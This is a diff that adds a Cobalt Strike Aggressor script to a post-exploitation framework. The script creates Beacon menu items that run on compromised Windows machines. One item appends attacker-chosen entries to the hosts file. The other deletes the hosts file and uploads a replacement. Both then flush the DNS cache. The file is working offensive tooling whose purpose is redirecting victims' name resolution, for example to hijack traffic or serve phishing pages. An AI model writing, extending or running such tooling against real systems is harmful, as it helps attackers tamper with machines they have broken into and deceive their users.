@@ -1,0 +1,21 @@
+popup beacon_bottom {
+	menu "Misc" {		
+		item "Add Host File Entry" {
+			prompt_text("Specify an entry to add to the host file:", "127.0.0.1 google.com", lambda({
+				bshell(@ids, 'echo ' . $1 . ' >> c:\\windows\\System32\\Drivers\\Etc\Hosts');
+				blog(@ids,"Adding the following entry to the host file: $1 ");
+				bshell(@ids, "ipconfig /flushdns");
+			}, @ids => $1));
+		}
+		item "Replace Host File" {
+			prompt_file_open("Choose a file to replace the current host file:", "hosts.txt", false, lambda({
+				bcd(@ids,"c:\\windows\\system32\\drivers\\etc");
+				brm(@ids,"hosts");
+				blog(@ids,"Uploading file $1 to c:\\windows\\system32\\drivers\\etc\\hosts");
+				bupload(@ids,$1);
+				bshell(@ids, "ipconfig /flushdns");
+				blog(@ids,"File uploaded and DNS flushed. Done!");
+			}, @ids => $1));
+		}
+	}
+}
